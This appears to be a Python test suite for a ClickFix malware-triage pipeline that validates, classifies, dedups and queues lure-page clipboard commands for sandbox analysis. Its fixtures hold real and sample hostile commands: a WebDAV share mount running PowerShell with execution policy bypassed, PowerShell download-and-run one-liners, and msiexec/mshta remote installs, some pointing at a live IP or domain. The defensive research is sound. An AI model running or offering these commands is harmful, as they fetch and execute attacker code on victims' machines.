"""Pre-submission pipeline: validation, classification, package selection,
payload-level dedup and the one-payload/many-sightings relationship."""

import base64
import os
import shutil
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import pipeline  # noqa: E402
from candidates import (  # noqa: E402
    CAND_API_ENDPOINT, CAND_ARCHIVE, CAND_LURE_PAGE, CAND_NON_PAGE, CAND_RESOURCE_JS,
    classify_candidate, is_probably_not_a_lure,
)
from classify import (  # noqa: E402
    PKG_BATCH, PKG_EXE, PKG_PS1, SUB_BAT_SCRIPT, SUB_CMD_ONELINER, SUB_PS_ONELINER,
    SUB_PS_SCRIPT, SUB_PS_VIA_CMD, TYPE_BATCH, TYPE_PE, TYPE_POWERSHELL, TYPE_UNKNOWN,
    classify_payload,
)
from config import Config  # noqa: E402
from extractor import ExtractResult  # noqa: E402
from state import ClickfixStore  # noqa: E402
from urlscan_source import Candidate  # noqa: E402
from validate import (  # noqa: E402
    R_HTML_MARKUP, R_INCOMPLETE_DECODER, R_JS_SOURCE, R_TOO_LONG, R_TRUNCATED,
    R_UI_PROSE, R_UNRESOLVED_TEMPLATE, validate_payload,
)

# Two real payloads recovered from live urlscan data during the dry-run.
REAL_WEBDAV = ('cmd.exe /c net use Z: http://144.31.47.76/webdav /persistent:no '
               '&& powershell -ExecutionPolicy Bypass -File "Z:\\script.ps1" '
               '& net use Z: /delete')
REAL_JSONP = ("Write-Host 'Cloudflare' -F Cyan -NoNewline; $w=New-Object Net.WebClient; "
              "$w.Headers.Add('User-Agent','Mozilla/5.0'); $u='http://x.invalid/get_verify'; "
              "$w.DownloadFile($u,$z); Expand-Archive $z -DestinationPath $d -Force")


class TestClassifierRealPayloads(unittest.TestCase):
    def test_webdav_cmd_launching_powershell(self):
        c = classify_payload(REAL_WEBDAV)
        self.assertEqual(c.payload_type, TYPE_POWERSHELL)
        self.assertEqual(c.subtype, SUB_PS_VIA_CMD)
        # Must run under cmd, not powershell -File, to stay faithful.
        self.assertEqual(c.cape_package, PKG_BATCH)
        self.assertTrue(c.submittable)

    def test_jsonp_raw_script_body(self):
        c = classify_payload(REAL_JSONP)
        self.assertEqual(c.payload_type, TYPE_POWERSHELL)
        self.assertEqual(c.subtype, SUB_PS_SCRIPT)
        self.assertEqual(c.cape_package, PKG_PS1)


class TestClassifierCoverage(unittest.TestCase):
    def test_powershell_oneliner(self):
        c = classify_payload('powershell -w hidden -nop -c "iex(irm http://x/a)"')
        self.assertEqual((c.payload_type, c.subtype, c.cape_package),
                         (TYPE_POWERSHELL, SUB_PS_ONELINER, PKG_PS1))

    def test_pwsh_variant(self):
        self.assertEqual(classify_payload("pwsh -nop -c iex 1").subtype, SUB_PS_ONELINER)

    def test_full_path_interpreter(self):
        c = classify_payload(r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -c x')
        self.assertEqual(c.subtype, SUB_PS_ONELINER)

    def test_cmd_only_is_batch(self):
        c = classify_payload("cmd.exe /c start calc.exe && del /f x")
        self.assertEqual((c.payload_type, c.subtype, c.cape_package),
                         (TYPE_BATCH, SUB_CMD_ONELINER, PKG_BATCH))

    def test_bat_script_body(self):
        c = classify_payload("@echo off\nsetlocal\nreg add HKCU\\x /v y\ngoto :eof")
        self.assertEqual((c.payload_type, c.subtype, c.cape_package),
                         (TYPE_BATCH, SUB_BAT_SCRIPT, PKG_BATCH))

    def test_pe_base64(self):
        blob = base64.b64encode(b"MZ\x90\x00" + b"A" * 400).decode()
        c = classify_payload(blob)
        self.assertEqual((c.payload_type, c.cape_package), (TYPE_PE, PKG_EXE))

    def test_pe_raw_header(self):
        c = classify_payload("MZ" + "\x00" * 40 + "This program cannot be run in DOS mode")
        self.assertEqual(c.payload_type, TYPE_PE)

    def test_ambiguous_is_unknown_and_not_submittable(self):
        c = classify_payload("please verify that you are a human being today")
        self.assertEqual(c.payload_type, TYPE_UNKNOWN)
        self.assertEqual(c.cape_package, "")
        self.assertFalse(c.submittable)

    def test_empty_is_unknown(self):
        self.assertEqual(classify_payload("").payload_type, TYPE_UNKNOWN)

    def test_classifier_records_reason_and_confidence(self):
        c = classify_payload(REAL_JSONP)
        self.assertTrue(c.reason)
        self.assertGreater(c.confidence, 0)
        self.assertTrue(c.signals)

    def test_homoglyph_powershell_still_classified(self):
        c = classify_payload("роwershell -w hidden -nop -c iex 1")
        self.assertEqual(c.payload_type, TYPE_POWERSHELL)


class TestValidator(unittest.TestCase):
    def test_real_payloads_are_valid(self):
        for p in (REAL_WEBDAV, REAL_JSONP):
            self.assertTrue(validate_payload(p).valid, p[:40])

    def test_unresolved_template_rejected(self):
        self.assertEqual(validate_payload("powershell ${atob(h)} -nop").reason,
                         R_UNRESOLVED_TEMPLATE)

    def test_javascript_source_rejected(self):
        self.assertEqual(
            validate_payload('navigator.clipboard.writeText("powershell -nop")').reason,
            R_JS_SOURCE)

    def test_script_tag_rejected(self):
        self.assertEqual(validate_payload('<script>powershell -nop</script>').reason,
                         R_JS_SOURCE)

    def test_html_markup_rejected(self):
        self.assertEqual(validate_payload("<div>powershell -w hidden -nop</div>").reason,
                         R_HTML_MARKUP)

    def test_function_declaration_rejected(self):
        r = validate_payload("function build(){ return 'powershell -nop'; }")
        self.assertFalse(r.valid)

    def test_ui_prose_rejected(self):
        self.assertEqual(validate_payload("PowerShell will now verify your browser").reason,
                         R_UI_PROSE)

    def test_instructions_prose_rejected(self):
        r = validate_payload("Please open PowerShell and paste the command below")
        self.assertFalse(r.valid)

    def test_incomplete_decoder_rejected(self):
        self.assertEqual(validate_payload('powershell -c atob("QQBB').reason,
                         R_INCOMPLETE_DECODER)

    def test_truncated_unbalanced_quotes_rejected(self):
        self.assertEqual(validate_payload('powershell -c "iex(irm http://x/a)').reason,
                         R_TRUNCATED)

    def test_truncated_trailing_operator_rejected(self):
        self.assertEqual(validate_payload("powershell -nop -c x &&").reason, R_TRUNCATED)

    def test_too_short_rejected(self):
        self.assertFalse(validate_payload("iex").valid)

    def test_large_real_command_allowed_but_large_junk_still_rejected(self):
        # content-aware length cap: a big obfuscated PowerShell loader (a real
        # command) is allowed well past the 20KB prose cap...
        big_ps = ('powershell.exe -NoProfile -ExecutionPolicy Bypass -Command '
                  '"$x=\'' + ('A' * 40000) + '\';IEX $x"')
        self.assertGreater(len(big_ps), 20000)
        self.assertTrue(validate_payload(big_ps).valid)
        # ...but an equally large blob with NO command marker is still too_long
        junk = "lorem ipsum dolor sit amet " * 2000
        self.assertEqual(validate_payload(junk).reason, R_TOO_LONG)
        # ...and a big HTML page that merely *mentions* powershell is caught by
        # the markup guard, not let through
        html = "<!DOCTYPE html><p>open powershell</p>" + "<div>x</div>" * 3000
        self.assertFalse(validate_payload(html).valid)

    def test_valid_payload_reports_signals(self):
        r = validate_payload(REAL_WEBDAV)
        self.assertTrue(r.valid)
        self.assertTrue(r.signals)


class TestCandidateTriage(unittest.TestCase):
    def test_html_page_is_lure_page(self):
        self.assertEqual(classify_candidate("https://x.invalid/", "text/html").kind,
                         CAND_LURE_PAGE)

    def test_js_resource(self):
        self.assertEqual(
            classify_candidate("https://x.invalid/js/all.min.js", "application/javascript").kind,
            CAND_RESOURCE_JS)

    def test_archive(self):
        self.assertEqual(classify_candidate("https://x.invalid/zxc/app.zip", "application/zip").kind,
                         CAND_ARCHIVE)

    def test_api_endpoint(self):
        self.assertEqual(
            classify_candidate("https://x.invalid/first_allow_host", "text/plain").kind,
            CAND_API_ENDPOINT)

    def test_image_is_non_page(self):
        self.assertEqual(classify_candidate("https://x.invalid/logo.png", "image/png").kind,
                         CAND_NON_PAGE)

    def test_non_lure_kinds_excluded_from_extractor_blame(self):
        for url, mime in (("https://x/a.png", "image/png"), ("https://x/a.zip", "application/zip"),
                          ("https://x/a.exe", "application/octet-stream")):
            self.assertTrue(is_probably_not_a_lure(classify_candidate(url, mime)), url)

    def test_lure_page_counts_against_extractor(self):
        self.assertFalse(is_probably_not_a_lure(classify_candidate("https://x/", "text/html")))


class PresubmissionCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="clickfix-presub-")
        cfg = Config()
        cfg.pipeline.db_path = os.path.join(self.tmp, "t.db")
        cfg.pipeline.commands_dir = os.path.join(self.tmp, "cmds")
        cfg.pipeline.audit_log = os.path.join(self.tmp, "audit.log")
        os.makedirs(cfg.pipeline.commands_dir, exist_ok=True)
        self.cfg = cfg
        self.store = ClickfixStore(cfg.pipeline.db_path)

    def tearDown(self):
        self.store.close()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def run_payload(self, text, uuid="u1", url="https://a.invalid/"):
        cand = Candidate(uuid, url, "")
        res = ExtractResult(command_text=text, method="json_field", layer="urlscan_dom",
                            final_url=url, original_url=url, normalized_url=url)
        row_id = self.store.insert_discovered("urlscan", uuid, url)
        payload = pipeline.process_recovered_payload(
            self.cfg, self.store, row_id, res, cand, None, submit=False)
        return row_id, payload


class TestPresubmissionFlow(PresubmissionCase):
    def test_valid_payload_becomes_ready_to_submit(self):
        row_id, payload = self.run_payload(REAL_JSONP)
        self.assertEqual(self.store.get(row_id)["status"], "ready_to_submit")
        self.assertEqual(payload["cape_package"], PKG_PS1)

    def test_webdav_payload_selects_batch_package(self):
        _, payload = self.run_payload(REAL_WEBDAV)
        self.assertEqual(payload["cape_package"], PKG_BATCH)
        self.assertEqual(payload["payload_subtype"], SUB_PS_VIA_CMD)

    def test_invalid_payload_is_stored_flagged_and_unsubmittable(self):
        # Invalid payloads are kept as evidence (with sightings) but must be
        # flagged invalid and must never appear in the submission queue.
        row_id, payload = self.run_payload("<script>powershell -nop</script>")
        row = self.store.get(row_id)
        self.assertEqual(row["status"], "invalid_payload")
        self.assertEqual(row["validation_status"], "invalid")
        self.assertIsNotNone(payload)
        self.assertEqual(payload["validation_status"], "invalid")
        self.assertEqual(self.store.payloads_awaiting_submission(), [])

    def test_template_seen_on_many_domains_is_one_payload_with_sightings(self):
        tmpl = ("$w=New-Object Net.WebClient; $u='REPLACE_SERVER/get_verify?i=REPLACE_ID'; "
                "$w.DownloadFile($u,$z)")
        for i in range(3):
            self.run_payload(tmpl, uuid=f"t{i}", url=f"https://kit{i}.invalid/first_allow")
        stats = self.store.payload_stats()
        self.assertEqual(stats["unique_payloads"], 1)
        self.assertEqual(stats["total_sightings"], 3)
        p = self.store._conn.execute("SELECT * FROM payloads").fetchone()
        self.assertEqual(p["validation_reason"], "unsubstituted_server_side_placeholder")
        self.assertEqual(self.store.payloads_awaiting_submission(), [])

    def test_unknown_type_is_held_back(self):
        row_id, payload = self.run_payload("net use Z: \\\\server\\share /user:bob pass1")
        row = self.store.get(row_id)
        self.assertIn(row["status"], ("unclassified_payload", "ready_to_submit"))
        if row["status"] == "unclassified_payload":
            self.assertEqual(payload["cape_package"], "")

    def test_original_text_is_preserved_verbatim(self):
        _, payload = self.run_payload(REAL_WEBDAV)
        self.assertEqual(payload["original_text"], REAL_WEBDAV)

    def test_defanged_preview_is_stored(self):
        _, payload = self.run_payload(REAL_WEBDAV)
        self.assertIn("hxxp", payload["defanged_preview"])
        self.assertNotIn("hxxp", payload["original_text"])

    def test_command_file_written_content_addressed(self):
        _, payload = self.run_payload(REAL_JSONP)
        path = os.path.join(self.cfg.pipeline.commands_dir, f"{payload['sha256']}.ps1")
        self.assertTrue(os.path.exists(path))
        with open(path) as fh:
            self.assertEqual(fh.read(), REAL_JSONP)


class TestPayloadDedupAndSightings(PresubmissionCase):
    def test_same_payload_three_domains_one_payload_row(self):
        for i, dom in enumerate(("a.invalid", "b.invalid", "c.invalid")):
            self.run_payload(REAL_JSONP, uuid=f"u{i}", url=f"https://{dom}/first_allow")
        stats = self.store.payload_stats()
        self.assertEqual(stats["unique_payloads"], 1)
        self.assertEqual(stats["total_sightings"], 3)

    def test_duplicate_sightings_are_preserved_not_deleted(self):
        for i in range(3):
            self.run_payload(REAL_JSONP, uuid=f"u{i}", url=f"https://d{i}.invalid/")
        payload = self.store.payload_by_sha(
            self.store.payload_stats() and
            self.store._conn.execute("SELECT sha256 FROM payloads").fetchone()["sha256"])
        sightings = self.store.sightings_for_payload(payload["id"])
        self.assertEqual(len(sightings), 3)
        self.assertEqual({s["source_uuid"] for s in sightings}, {"u0", "u1", "u2"})

    def test_second_sighting_marked_duplicate_payload(self):
        self.run_payload(REAL_JSONP, uuid="u1", url="https://a.invalid/")
        row_id, _ = self.run_payload(REAL_JSONP, uuid="u2", url="https://b.invalid/")
        self.assertEqual(self.store.get(row_id)["status"], "duplicate_payload")

    def test_duplicate_links_to_existing_task(self):
        self.run_payload(REAL_JSONP, uuid="u1", url="https://a.invalid/")
        p = self.store._conn.execute("SELECT * FROM payloads").fetchone()
        self.store.update_payload(p["id"], cape_task_id=4242)
        row_id, _ = self.run_payload(REAL_JSONP, uuid="u2", url="https://b.invalid/")
        self.assertEqual(self.store.get(row_id)["cape_task_id"], 4242)

    def test_different_payloads_are_separate_rows(self):
        self.run_payload(REAL_JSONP, uuid="u1", url="https://a.invalid/")
        self.run_payload(REAL_WEBDAV, uuid="u2", url="https://b.invalid/")
        self.assertEqual(self.store.payload_stats()["unique_payloads"], 2)

    def test_awaiting_submission_excludes_invalid_and_unknown(self):
        self.run_payload(REAL_JSONP, uuid="u1", url="https://a.invalid/")
        self.run_payload("<script>powershell -nop</script>", uuid="u2", url="https://b.invalid/")
        pending = self.store.payloads_awaiting_submission()
        self.assertEqual(len(pending), 1)
        self.assertEqual(pending[0]["payload_type"], TYPE_POWERSHELL)

    def test_nothing_is_submitted_by_the_presubmission_stage(self):
        self.run_payload(REAL_JSONP)
        n = self.store._conn.execute(
            "SELECT COUNT(*) n FROM payloads WHERE cape_task_id IS NOT NULL").fetchone()["n"]
        self.assertEqual(n, 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)


class TestDeadInfrastructure(unittest.TestCase):
    """Real captures: lure domains taken down before urlscan visited."""

    def test_cloudflare_520(self):
        from extractor import looks_like_error_page
        self.assertTrue(looks_like_error_page(
            "<head><title>shelternode18.com | 520: Web server is returning an "
            "unknown error</title></head>"))

    def test_nginx_404(self):
        from extractor import looks_like_error_page
        self.assertTrue(looks_like_error_page(
            "<head><title>404 Not Found</title></head><body><center><h1>404 Not Found"
            "</h1></center><hr><center>nginx</center></body>"))

    def test_502_bad_gateway(self):
        from extractor import looks_like_error_page
        self.assertTrue(looks_like_error_page("<title>502 Bad Gateway</title>"))

    def test_real_lure_is_not_an_error_page(self):
        from extractor import looks_like_error_page
        self.assertFalse(looks_like_error_page(
            "<title>Verify you are human</title><p>Press Win+R then Ctrl+V</p>"))

    def test_error_page_classified_as_dead_infrastructure(self):
        from config import ExtractConfig
        from extractor import FAIL_DEAD_INFRA, extract_command
        from urlscan_result import ScanDetail
        scan = ScanDetail(
            uuid="u-dead", task_url="http://gone.invalid/", final_url="http://gone.invalid/",
            dom="<head><title>gone.invalid | 520: Web server is returning an unknown "
                "error</title></head><body>checking if you are a robot</body>",
        )
        r = extract_command("http://gone.invalid/", ExtractConfig(fetch_timeout=2), scan=scan)
        self.assertEqual(r.failure_reason, FAIL_DEAD_INFRA)


class TestServerSidePlaceholders(unittest.TestCase):
    """The bb20016118 payload recovered from live urlscan data turned out to be
    a kit TEMPLATE, not a resolved payload."""

    REAL_TEMPLATE = ("Write-Host 'Cloudflare' -F Cyan; $w=New-Object Net.WebClient; "
                     "$u='REPLACE_SERVER/get_verify?i=REPLACE_ID&m=REPLACE_METHOD'; "
                     "$d='C:\\ProgramData\\REPLACE_RAY'; $w.DownloadFile($u,$z)")

    def test_replace_placeholders_rejected(self):
        from validate import R_PLACEHOLDER
        r = validate_payload(self.REAL_TEMPLATE)
        self.assertFalse(r.valid)
        self.assertEqual(r.reason, R_PLACEHOLDER)

    def test_curly_template_rejected(self):
        self.assertFalse(validate_payload("powershell -c iex(irm {{C2_HOST}}/a.ps1)").valid)

    def test_angle_placeholder_rejected(self):
        self.assertFalse(validate_payload("powershell -c iex(irm http://<<SERVER>>/a)").valid)

    def test_resolved_webdav_payload_still_valid(self):
        self.assertTrue(validate_payload(REAL_WEBDAV).valid)

    def test_legitimate_word_replace_not_over_matched(self):
        # Must not reject a real command that merely uses -replace or Replace().
        self.assertTrue(validate_payload(
            "powershell -nop -c \"$x='a'; $x -replace 'a','b'; iex(irm http://x.invalid/a)\""
        ).valid)


class TestLolbinRemoteInstall(unittest.TestCase):
    """msiexec/mshta/rundll32 remote-install command lines recovered from the
    300-candidate measurement run. CAPE's msi package expects a LOCAL .msi, so
    these must run as a cmd command line under `batch`."""

    def test_msiexec_remote_install_is_batch(self):
        from classify import PKG_BATCH, SUB_MSIEXEC, TYPE_BATCH
        c = classify_payload("msiexec /i https://pizzabyte.com.au/CF/path/captcha")
        self.assertEqual(c.payload_type, TYPE_BATCH)
        self.assertEqual(c.subtype, SUB_MSIEXEC)
        self.assertEqual(c.cape_package, PKG_BATCH)
        self.assertTrue(c.submittable)

    def test_msiexec_with_qn_flag(self):
        from classify import PKG_BATCH
        self.assertEqual(classify_payload("msiexec /i https://x.invalid/step /qn").cape_package,
                         PKG_BATCH)

    def test_mshta_remote_is_batch(self):
        from classify import PKG_BATCH
        self.assertEqual(classify_payload("mshta https://evil.invalid/a.hta").cape_package,
                         PKG_BATCH)

    def test_local_msi_path_not_misrouted(self):
        # A bare local msiexec without a URL is NOT a remote-install one-liner.
        c = classify_payload("msiexec /i C:\\Users\\x\\app.msi /quiet")
        self.assertNotEqual(c.subtype, "msiexec_remote_install")

    def test_msiexec_remote_install_validates(self):
        self.assertTrue(validate_payload("msiexec /i https://pizzabyte.com.au/CF/path/captcha").valid)


class TestFix3CandidateSkip(unittest.TestCase):
    """Fix 3: extraction skipped for binary/archive/non_page candidate types."""
    def setUp(self):
        import tempfile, shutil
        from config import Config
        from state import ClickfixStore
        self.tmp = tempfile.mkdtemp(prefix="clickfix-fix3-")
        cfg = Config()
        cfg.pipeline.db_path = self.tmp + "/t.db"
        cfg.pipeline.audit_log = self.tmp + "/a.log"
        cfg.urlscan.use_result_api = False
        self.cfg = cfg
        self.store = ClickfixStore(cfg.pipeline.db_path)
        self._shutil = shutil
    def tearDown(self):
        self.store.close(); self._shutil.rmtree(self.tmp, ignore_errors=True)
    def _run(self, ctype):
        import pipeline
        rid = self.store.insert_discovered("urlscan", "u-"+ctype, "https://x.invalid/a."+ctype)
        pipeline._process_extraction(self.cfg, self.store, rid, "https://x.invalid/a",
                                     "u-"+ctype, None, candidate_type=ctype)
        return self.store.get(rid)
    def test_archive_skipped(self):
        self.assertEqual(self._run("archive")["status"], "skipped_non_lure")
    def test_binary_skipped(self):
        self.assertEqual(self._run("binary")["status"], "skipped_non_lure")
    def test_non_page_skipped(self):
        self.assertEqual(self._run("non_page")["status"], "skipped_non_lure")


class TestFix3ThroughRealCaller(unittest.TestCase):
    """Fix 3 exercised through the REAL discovery caller: discover_and_extract
    computes candidate_type via classify_candidate and must skip an archive
    candidate WITHOUT fetching it."""
    def setUp(self):
        import tempfile, shutil
        from config import Config
        from state import ClickfixStore
        self.tmp = tempfile.mkdtemp(prefix="clickfix-fix3e2e-")
        cfg = Config()
        cfg.pipeline.db_path = self.tmp + "/t.db"
        cfg.pipeline.audit_log = self.tmp + "/a.log"
        cfg.urlscan.use_result_api = False
        self.cfg = cfg
        self.store = ClickfixStore(cfg.pipeline.db_path)
        self._shutil = shutil
    def tearDown(self):
        self.store.close(); self._shutil.rmtree(self.tmp, ignore_errors=True)
    def test_discover_skips_archive_candidate_without_fetch(self):
        import pipeline
        from urlscan_source import Candidate
        # Stub discovery to return one archive (.zip) candidate; stub _fetch to
        # blow up if ever called (proves the skip happens BEFORE any fetch).
        orig_search = pipeline.search_candidates
        orig_extract = pipeline.extract_command
        pipeline.search_candidates = lambda cfg, **k: [
            Candidate("uuid-zip", "https://x.invalid/payload.zip", "2026-10-14T00:00:00Z",
                      mime="application/zip")
        ]
        def _boom(*a, **k):
            raise AssertionError("extract_command/_fetch must NOT run for an archive candidate")
        pipeline.extract_command = _boom
        try:
            pipeline.discover_and_extract(self.cfg, self.store)
        finally:
            pipeline.search_candidates = orig_search
            pipeline.extract_command = orig_extract
        rows = self.store.list_all(10)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["status"], "skipped_non_lure")
        self.assertEqual(rows[0]["candidate_type"], "archive")
